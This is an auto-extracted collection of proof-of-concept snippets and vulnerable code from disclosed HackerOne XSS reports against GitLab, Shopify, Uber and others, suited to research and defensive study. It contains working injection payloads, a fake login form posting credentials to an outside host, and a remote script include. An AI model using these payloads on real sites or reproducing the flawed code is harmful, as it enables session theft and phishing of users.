# XSS — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #1212067 Stored XSS in markdown via the DesignReferenceFilter  — gitlab — $16,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2021/1212067.md` (https://hackerone.com/reports/1212067)

```
    def self.link_reference_pattern
      @link_reference_pattern ||= begin
        path_segment = %r{issues/#{Gitlab::Regex.issue}/designs}
        ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_IMAGE_EXT).source, Regexp::IGNORECASE)
        valid_char = %r{[^/\s]} # any char that is not a forward slash or whitespace
        filename_pattern = %r{
          (?<url_filename> #{valid_char}+ \. #{ext})
        }x

        super(path_segment, filename_pattern)
      end
    end
```

```
def parse_symbol(raw, match_data)
  filename = match_data[:url_filename]
  iid = match_data[:issue].to_i
  Identifier.new(filename: CGI.unescape(filename), issue_iid: iid)
end
```

```
url =
  if matches.names.include?("url") && matches[:url]
    matches[:url]
  else
    url_for_object_cached(object, parent)
  end

content = link_content || object_link_text(object, matches)

link = %(<a href="#{url}" #{data}
            title="#{escape_once(title)}"
            class="#{klass}">#{content}</a>)
```

## #1731349 Stored XSS via Kroki diagram — gitlab — $13,950 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2023/1731349.md` (https://hackerone.com/reports/1731349)

```
        diagram_selectors = ::Gitlab::Kroki.formats(settings)
                                .map do |diagram_type|
                                  %(pre[lang="#{diagram_type}"] > code,
                                  pre > code[lang="#{diagram_type}"])
                                end
                                .join(', ')

        xpath = Gitlab::Utils::Nokogiri.css_to_xpath(diagram_selectors)
        return doc unless doc.at_xpath(xpath)

        diagram_format = "svg"
        doc.xpath(xpath).each do |node|
          diagram_type = node.parent['lang'] || node['lang']
          diagram_src = node.content
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
```

```
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
          img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src="#{image_src}" />))
          img_tag = img_tag.children.first

          next if img_tag.nil?

          lazy_load = diagram_src.length > MAX_CHARACTER_LIMIT
          img_tag.set_attribute('hidden', '') if lazy_load
          img_tag.set_attribute('class', 'js-render-kroki')

          img_tag.set_attribute('data-diagram', diagram_type)
          img_tag.set_attribute('data-diagram-src', "data:text/plain;base64,#{Base64.strict_encode64(diagram_src)}")

          node.parent.replace(img_tag)
```

```
    return axios
      .get(this.diffForPath)
      .then(({ data }) => {
        this.loadingContent.hide();
        if (data.html) {
          this.content = $(data.html);
```

## #1578400 New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields — gitlab — $13,950 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2022/1578400.md` (https://hackerone.com/reports/1578400)

```
System:         Ubuntu 20.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.7.5p203
Gem Version:    3.1.4
Bundler Version:2.2.33
Rake Version:   13.0.6
Redis Version:  6.2.6
Sidekiq Version:6.4.0
Go Version:     unknown

GitLab information
Version:        15.0.0-ee
Revision:       3b397c17532
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     12.10
URL:            http://gitlab-pentest4.example.com
HTTP Clone URL: http://gitlab-pentest4.example.com/some-group/some-project.git
SSH Clone URL:  git@gitlab-pentest4.example.com:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        14.3.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
```

## #131450 Stored XSS in developer.uber.com — uber — $7,500 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2016/131450.md` (https://hackerone.com/reports/131450)

```
POST /users/session HTTP/1.1
Host: uber.readme.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 84
Cookie: YOUR CONNECT.SID COOKIE HERE
Connection: close
Pragma: no-cache
Cache-Control: no-cache

{"email":"readme2@thursday.eml.cc","password":"pjJnBODjkLFv!!11","action":"session"}
```

```
{"id":"57129b7365324b0e002ad83b","name":"James Kettle","email":"readme2@thursday.eml.cc","username":"","provider":"local","createdAt":"2016-04-16T20:07:15.871Z","accessToken":"","stripeId":"","hasStripe":false,"email_verified":false,"hasGithub":false,"github":{},"is_admin":false,"is_god":false}
```

## #1276742 Stored XSS in SVG file as data: url — shopify — $5,300 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2023/1276742.md` (https://hackerone.com/reports/1276742)

```
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9InZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgcmVxLm9wZW4oJ0dFVCcsICdodHRwczovL3VzLWJhc2VkLW9yZ2FuaXphdGlvbi1oMS5teXNob3BpZnkuY29tL2FkbWluJywgZmFsc2UpOyByZXEuc2V0UmVxdWVzdEhlYWRlcignVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cycsICcxJyk7cmVxLnNldFJlcXVlc3RIZWFkZXIoJ1VzZXItQWdlbnQnLCAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc1LjAuMzc3MC4xMDAgU2FmYXJpLzUzNy4zNicpIDtyZXEuc2VuZChudWxsKTt2YXIgaGVhZGVycyA9IHJlcS5yZXNwb25zZS50b0xvd2VyQ2FzZSgpO2NvbnNvbGUubG9nKGhlYWRlcnMpOyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iTGF5ZXJfMSIgeD0iMHB4IiB5PSIwcHgiIHZpZXdCb3g9IjAgMCAxMDAgMTAwIiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCAxMDAgMTAwIiB4bWw6c3BhY2U9InByZXNlcnZlIiBoZWlnaHQ9IjEwMHB4IiB3aWR0aD0iMTAwcHgiPgo8Zz4KCTxwYXRoIGQ9Ik0yOC4xLDM2LjZjNC42LDEuOSwxMi4yLDEuNiwyMC45LDEuMWM4LjktMC40LDE5LTAuOSwyOC45LDAuOWM2LjMsMS4yLDExLjksMy4xLDE2LjgsNmMtMS41LTEyLjItNy45LTIzLjctMTguNi0zMS4zICAgYy00LjktMC4yLTkuOSwwLjMtMTQuOCwxLjRDNDcuOCwxNy45LDM2LjIsMjUuNiwyOC4xLDM2LjZ6Ii8+Cgk8cGF0aCBkPSJNNzAuMyw5LjhDNTcuNSwzLjQsNDIuOCwzLjYsMzAuNSw5LjVjLTMsNi04LjQsMTkuNi01LjMsMjQuOWM4LjYtMTEuNywyMC45LTE5LjgsMzUuMi0yMy4xQzYzLjcsMTAuNSw2NywxMCw3MC4zLDkuOHoiLz4KCTxwYXRoIGQ9Ik0xNi41LDUxLjNjMC42LTEuNywxLjItMy40LDItNS4xYy0zLjgtMy40LTcuNS03LTExLTEwLjhjLTIuMSw2LjEtMi44LDEyLjUtMi4zLDE4LjdDOS42LDUxLjEsMTMuNCw1MC4yLDE2LjUsNTEuM3oiLz4KCTxwYXRoIGQ9
```

```
<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://us-based-organization-h1.myshopify.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve" height="100px" width="100px">
<g>
	<path d="M28.1,36.6c4.6,1.9,12.2,1.6,20.9,1.1c8.9-0.4,19-0.9,28.9,0.9c6.3,1.2,11.9,3.1,16.8,6c-1.5-12.2-7.9-23.7-18.6-31.3   c-4.9-0.2-9.9,0.3-14.8,1.4C47.8,17.9,36.2,25.6,28.1,36.6z"/>
	<path d="M70.3,9.8C57.5,3.4,42.8,3.6,30.5,9.5c-3,6-8.4,19.6-5.3,24.9c8.6-11.7,20.9-19.8,35.2-23.1C63.7,10.5,67,10,70.3,9.8z"/>
	<path d="M16.5,51.3c0.6-1.7,1.2-3.4,2-5.1c-3.8-3.4-7.5-7-11-10.8c-2.1,6.1-2.8,12.5-2.3,18.7C9.6,51.1,13.4,50.2,16.5,51.3z"/>
	<path d="M9,31.6c3.5,3.9,7.2,7.6,11.1,11.1c0.8-1.6,1.7-3.1,2.6-4.6c0.1-0.2,0.3-0.4,0.4-0.6c-2.9-3.3-3.1-9.2-0.6-17.6   c0.8-2.7,1.8-5.3,2.7-7.4c-5.2,3.4-9.8,8-13.3,13.7C10.8,27.9,9.8,29.7,9,31.6z"/>
	<path d="M15.4,54.7c-2.6-1-6.1,0.7-9.7,3.4c1.2,6.6,3.9,13,8,18.5C13,69.3,13.5,61.8,15.4,54.7z"/>
	<path d="M39.8,57.6C54.3,66.7,70,73,86.5,76.4c0.6-0.8,1.1-1.6,1.7-2.5c4.8-7.7,7-16.3,6.8-24.8c-13.8-9.3-31.3-8.4
```

## #299728 Markdown parsing issue enables insertion of malicious tags and event handlers — security — $5,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2018/299728.md` (https://hackerone.com/reports/299728)

```
</http:<marquee>hello
```

```
<p><a title="/http:<marquee" href="/http:%3Cmarquee" target="_blank">/http:<marquee>hello</p>
</marquee></a></p>
```

## #232174 XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications — shopify — $5,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2017/232174.md` (https://hackerone.com/reports/232174)

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
```

```
/admin/oauth/authorize?client_id=672a937d5eb24e10c756ea256c73bb8c&scope=read_products&redirect_uri=https://attackerdoma.in/93ba4bef-cff1-43b1-922d-0631bd387e2e.html&state=nonce
```

## #836649 Stored XSS in markdown when redacting references — gitlab — $5,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2020/836649.md` (https://hackerone.com/reports/836649)

```
    def redacted_node_content(node)
      original_content = node.attr('data-original')
      link_reference = node.attr('data-link-reference')

      # Build the raw <a> tag just with a link as href and content if
      # it's originally a link pattern. We shouldn't return a plain text href.
      original_link =
        if link_reference == 'true'
          href = node.attr('href')
          content = original_content

          %(<a href="#{href}">#{content}</a>)
        end

      # The reference should be replaced by the original link's content,
      # which is not always the same as the rendered one.
      original_link || original_content || node.inner_html
    end
```

```
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
    
```

```
<div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div>
    
```

## #152067 Stored XSS on developer.uber.com via admin account compromise — uber — $5,000 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2016/152067.md` (https://hackerone.com/reports/152067)

```
POST /api/accept-invite/5617f98f7f74330d00dfd86d HTTP/1.1
Host: dash.readme.io
Connection: close
Content-Length: 2
Accept: application/json, text/plain, */*
X-NewRelic-ID: XQEHWF5UGwYHXVlSDgY=
Origin: https://dash.readme.io
X-XSRF-TOKEN:<your token here>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
DNT: 1
Referer: https://dash.readme.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Cookie: <your cookies here>
```

## #49652 Improperly validated fields allows injection of arbitrary HTML via spoofed React objects — security — $5,000 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2015/49652.md` (https://hackerone.com/reports/49652)

```
$.ajax({ 
  url: "https://hackerone.com/reports/bulk", 
  method: 'post', 
  contentType: "application/json", 
  data: JSON.stringify({ 
    state: "open", 
    substate: "triaged", 
    report_ids: [… id of the report …], 
    reply_action: "change-state", 
    reference: {
      _isReactElement: true,
      _store: {},
      type:"body",
      props: {
        dangerouslySetInnerHTML: {
          __html:
            "<h1>Arbitrary HTML</h1><script>alert('No CSP Support :(')</script>"
        }
      }
    }   
  }) 
})
```

```
    state: "open", 
    substate: "triaged", 
    report_ids: [… id of the report …], 
    reply_action: "change-state", 
    reference: {
      _isReactElement: true,
      _store: {},
      type:"body",
      props: {
        dangerouslySetInnerHTML: {
          __html:
            "<h1>Arbitrary HTML</h1><script>alert('No CSP Support :(')</script>"
        }
      }
    }   
```

## #46072 Vulnerability with the way \ escaped characters in <http://danlec.com> style links are rendered — security — $5,000 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2015/46072.md` (https://hackerone.com/reports/46072)

```
<http://\<img\ src=\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\"\>
```

```
<http://\<style\>.markdownable\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red !important}\</style\>>
```

```
<http://\<a\ href=\"http://danlec.com\"\>Redirect\ bypassed\</a\>>
```

## #127948 Stored XSS on newsroom.uber.com admin panel / Stream WordPress plugin — uber — $5,000 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2016/127948.md` (https://hackerone.com/reports/127948)

```
        public static function callback_wp_redirect( $location ) {
                if ( ! preg_match( '#(plugin)-editor.php#', $location, $match ) ) {
                        return $location;
                }
                $type = $match[1];
                list( $url, $query ) = explode( '?', $location );
                $query = wp_parse_args( $query );
                $file  = $query['file'];
                if ( empty( $query['file'] ) ) {
                        return $location;
                }
                /* SNIP ... */ elseif ( 'plugin' === $type ) {
                        global $plugin, $plugins;
                        $plugin_base = current( explode( '/', $plugin ) );
                        foreach ( $plugins as $key => $plugin_data ) {
                                if ( $plugin_base === current( explode( '/', $key ) ) ) {
                                        $name = $plugin_data['Name'];
                                        break;
                                }
                        }
                }
                self::log(
                        _x(
                                'Edited %1$s: %2$s',
                                'Plugin/theme editing. 1: Type (plugin/theme), 2: Plugin/theme name',
                                'stream'
                        ),
                        compact( 'type', 'name', 'file' ),null, array( $type . 's' => 'edited' ));
```

## #46916 Markdown parsing issue enables insertion of malicious tags and event handlers — security — $5,000 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2015/46916.md` (https://hackerone.com/reports/46916)

```
_http://danlec_@.1 foo=bar
```

```
<p><u><a title="http://danlec" href="http://danlec">http://danlec<danlec_@.1 foo=bar</p>
```

```
_http://danlec_@.1 style=background-image:url(... data uri ...);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
```

## #508184 Persistent XSS in Note objects — gitlab — $4,500 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2019/508184.md` (https://hackerone.com/reports/508184)

```
      define_method(invalidation_method) do
        changed_fields = changed_attributes.keys
        invalidations  = changed_fields & [markdown_field.to_s, *INVALIDATED_BY]
        invalidations.delete(markdown_field.to_s) if changed_fields.include?("#{markdown_field}_html")

        !invalidations.empty? || !cached_html_up_to_date?(markdown_field)
      end
```

```
        INVALIDATED_BY = %w[author project].freeze
...
        invalidations  = changed_fields & [markdown_field.to_s, *INVALIDATED_BY]
        invalidations.delete(markdown_field.to_s) if changed_fields.include?("#{markdown_field}_html")
```

```
note_object.changed_attributes.keys
=> ["note", "noteable_type", "author_id", "created_at", "updated_at", "project_id", "line_code", "position", "original_position", "note_html", "cached_markdown_version", "change_position", "attachment"]
```

## #946728 SafeParamsHelper::safe_params is not so safe — gitlab — $4,000 — Cross-site Scripting (XSS) - Reflected
Source: `hackerone/reports/2020/946728.md` (https://hackerone.com/reports/946728)

```
  def safe_params
    if params.respond_to?(:permit!)
      params.except(:host, :port, :protocol).permit!
    else
      params
    end
  end
```

```
RESERVED_OPTIONS = [:host, :protocol, :port, :subdomain, :domain, :tld_length,
                          :trailing_slash, :anchor, :params, :only_path, :script_name,
                          :original_script_name, :relative_url_root]
```

```
def ensure_canonical_path(routable, requested_full_path)
    return unless request.get?

    canonical_path = routable.full_path
    if canonical_path != requested_full_path
      if !request.xhr? && request.format.html? && canonical_path.casecmp(requested_full_path) != 0
        flash[:notice] = "#{routable.class.to_s.titleize} '#{requested_full_path}' was moved to '#{canonical_path}'. Please update any links and bookmarks that may still have the old path."
      end

      redirect_to build_canonical_path(routable)
    end
  end
```

## #662287 Cross-site Scripting (XSS) - Stored in RDoc wiki pages — gitlab — $3,500 — UI Redressing (Clickjacking)
Source: `hackerone/reports/2019/662287.md` (https://hackerone.com/reports/662287)

```
{
<a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'>
<img height=10000 width=10000></a>
}[a]
```

```
<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://aw.rs/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>
```

```
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://aw.rs/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="password" class="form-control">
</div>
<div class="form-actions"><button name="button" type="submit" class="btn btn-success">Login</button></div>
</form>
</div>
</div>
</div>
</div>
}[/]
```

## #723307 Stored XSS in merge request pages — gitlab — $3,500 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2023/723307.md` (https://hackerone.com/reports/723307)

```
    touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
    
    git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
    touch 2.txt
    git add 2.txt
    git commit -m "add 2.txt"
    git push origin "<img/src='x'/onerror=alert(document.domain)>"
    
    git checkout master
    touch 3.txt
    git add 3.txt
    git commit -m "add 3.txt"
    git push origin master
    
```

```
root@gitlab:/# gitlab-rake gitlab:env:info

System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.0
Revision:	1425a56c75b
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
root@gitlab:/# 
```

```
    '''bash
    touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
```

## #1198517 Stored XSS in custom emoji — gitlab — $3,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2021/1198517.md` (https://hackerone.com/reports/1198517)

```
    def emoji_image_tag(name, src)
      "<img class='emoji' title=':#{name}:' alt=':#{name}:' src='#{src}' height='20' width='20' align='absmiddle' />"
    end

    ...

    def custom_emoji_tag(name, image_source)
      data = {
        name: name
      }

      ActionController::Base.helpers.content_tag('gl-emoji', title: name, data: data) do
        emoji_image_tag(name, image_source).html_safe
      end
    end
```

```
# gitlab-rails console
--------------------------------------------------------------------------------
 Ruby:         ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]
 GitLab:       13.11.3 (b321336e443) FOSS
 GitLab Shell: 13.17.0
 PostgreSQL:   12.6
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.3.6)
irb(main):001:0> Feature.enable(:custom_emoji)
=> true
```

```
mutation {
  createCustomEmoji(input: 
    {
      groupPath: "xss_target", 
      name:"xssreplace",
      url:"http://aaa#'><img onerror=alert(location) src=.>"
    }) {
    customEmoji {
      id
      name
      url
    }
  }
}
```

## #231053 XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on "/:id/digital_wallets/dialog" — shopify — $3,000 — Cross-site Scripting (XSS) - DOM
Source: `hackerone/reports/2017/231053.md` (https://hackerone.com/reports/231053)

```
this._messageHandler = function(event) {
  if (event.data) {
    if (event.data.type && event.data.digitalWalletsDialog) {
      c(i, event.data.type, event.data.payload);
    }
  }
}
this._localWindow.addEventListener("message", this._messageHandler)
```

```
function c(inst, type, payload) {
  switch (type) {
    case ze.DIALOG_CHANGE: // DigitalWalletsDialog:change
      if (d(payload)) { // Check that the required fields are present
        g(inst) // Reset the DOM
        p(inst, payload) // Insert the payload into the DOM
...
```

```
function d(payload) {
  var required = ["title", "button"]
  for (var idx = 0; idx < required.length; idx++)
    if (!payload[required[idx]] || "" === !payload[required[idx]]) {
      return false
    }
    return true
}
function g(inst) {
  for (var idx in inst.customizableElements) {
    inst.customizableElements[idx].innerHTML = ""
    inst.customizableElements[idx].classList.remove("hidden")
  }
  inst.customizableElements.errorList.scrollTop = 0
}
```

## #1106238 Stored XSS via Mermaid Prototype Pollution vulnerability — gitlab — $3,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2021/1106238.md` (https://hackerone.com/reports/1106238)

```
  let userStyles = '';
  // user provided theme CSS
  if (cnf.themeCSS !== undefined) {
    userStyles += `\n${cnf.themeCSS}`;
  }
  // user provided theme CSS
  if (cnf.fontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;
  }
  // user provided theme CSS
  if (cnf.altFontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;
  }
```

```
%%{init: { '__proto__': {'polluted': 'asdf'}} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

```
    userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;
```

## #856554 Stored XSS on the job page — gitlab — $3,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2021/856554.md` (https://hackerone.com/reports/856554)

```
    deploy:
      stage: deploy
      script:
        - echo "Example"
      environment:
        name: production
        url: https://google.com
        kubernetes:
          namespace: <img src=x onerror=alert(1)>
      only:
      - master
    
```

```
    '''
    deploy:
      stage: deploy
      script:
        - echo "Example"
      environment:
        name: production
        url: https://google.com
        kubernetes:
          namespace: <img src=x onerror=alert(1)>
      only:
      - master
    '''
```

## #1280002 Stored XSS via Mermaid Prototype Pollution vulnerability — gitlab — $3,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2021/1280002.md` (https://hackerone.com/reports/1280002)

```
%%{init: { '__proto__': {'template': '<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\">'}} }%%
%%{init: { '__proto__': {'template': '<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\">'}} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

## #1398305 Stored XSS on issue comments and other pages which contain notes — gitlab — $3,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2022/1398305.md` (https://hackerone.com/reports/1398305)

```
 def highlight_node(node)
...
sourcepos = node.parent.attr('data-sourcepos')
...
sourcepos_attr = sourcepos ? "data-sourcepos=\"#{sourcepos}\"" : ""

 highlighted = %(<pre #{sourcepos_attr} class="#{css_classes}"
                             lang="#{language}"
                             #{lang_params}
                             v-pre="true"><code>#{code}</code></pre>)
```

```
export function emojiImageTag(name, src) {
  return `<img class="emoji" title=":${name}:" alt=":${name}:" src="${src}" width="20" height="20" align="absmiddle" />`;
}
```

```
<pre data-sourcepos="&#34; href=&#34;x&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

## #299424 Bypass Filter and get Stored Xss  — shopify — $3,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2018/299424.md` (https://hackerone.com/reports/299424)

```
<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
```

## #1103258 Stored DOM XSS via Mermaid chart — gitlab — $3,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2021/1103258.md` (https://hackerone.com/reports/1103258)

```
  let userStyles = '';
  // user provided theme CSS
  if (cnf.themeCSS !== undefined) {
    userStyles += `\n${cnf.themeCSS}`;
  }
  // user provided theme CSS
  if (cnf.fontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;
  }
  // user provided theme CSS
  if (cnf.altFontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;
  }
```

```
  const stylis = new Stylis();
  const rules = stylis(`#${id}`, getStyles(graphType, userStyles, cnf.themeVariables));

  const style1 = document.createElement('style');
  style1.innerHTML = rules;
  svg.insertBefore(style1, firstChild);
```

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
```

## #856836 Stored XSS on PyPi simple API endpoint — gitlab — $3,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2020/856836.md` (https://hackerone.com/reports/856836)

```
      def package_link(url, required_python, filename)
        "<a href=\"#{url}\" data-requires-python=\"#{required_python}\">#{filename}</a><br>"
      end
```

```
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
    
```

```
        <!DOCTYPE html>
        <html>
          <head>
            <title>Links for package_test_1</title>
          </head>
          <body>
            <h1>Links for package_test_1</h1>
            <a href="https://gitlab.com/api/v4/projects/18315917/packages/pypi/files/lala.txt#sha256=" data-requires-python=""><script>alert(1)</script>">lala.txt</a><br>
          </body>
        </html>
    
```

## #126906 Stored XSS in archive.uber.com Due to Injection of Javascript:alert(0) — uber — $3,000 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2016/126906.md` (https://hackerone.com/reports/126906)

```
An example of a setup.py that can exploit this is: 
```

```
As with #126197, my PoC will be active once you run the mirror process to update archive.uber.com from pypi. Conveniently enough,, it looks like this was historically exploited on pypi, so a PoC (not mine) is already hosted on archive.uber.com here: 
```

```
In order to see the alert(0) box you have to click on the link titled 
```

## #603764 DOM Based XSS via postMessage at https://inventory.upserve.com/login/ — upserve — $2,500 — Cross-site Scripting (XSS) - DOM
Source: `hackerone/reports/2019/603764.md` (https://hackerone.com/reports/603764)

```
window.addEventListener("message", function(e) {
  if (~e.origin.indexOf("https://hq.upserve.com")) {
    if (e.data && typeof e.data == "object") {
      try {
        if (e.data["exec"]) {
          eval(e.data["exec"]);
        }
      } catch (err) {
        console.log(err);
      }
    } else {
      console.log("Non-object passed");
    }
  } else {
    console.log("Incorrect origin: " + e.origin.toString());
    return;
  }
});
```

```
    if (e.data && typeof e.data == "object") {
      try {
        if (e.data["exec"]) {
          eval(e.data["exec"]);
        }
      } catch (err) {
        console.log(err);
      }
    } else {
      console.log("Non-object passed");
    }
```

```
    console.log("Incorrect origin: " + e.origin.toString());
    return;
```

## #1805873 Rails ActionView sanitize helper bypass leading to XSS using SVG tag. — ibb — $2,400 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2023/1805873.md` (https://hackerone.com/reports/1805873)

```
<%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>", tags: %w(svg use) %>
```

```
<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'>
<image href="1" onerror="alert(window.origin)" />
</svg>
```

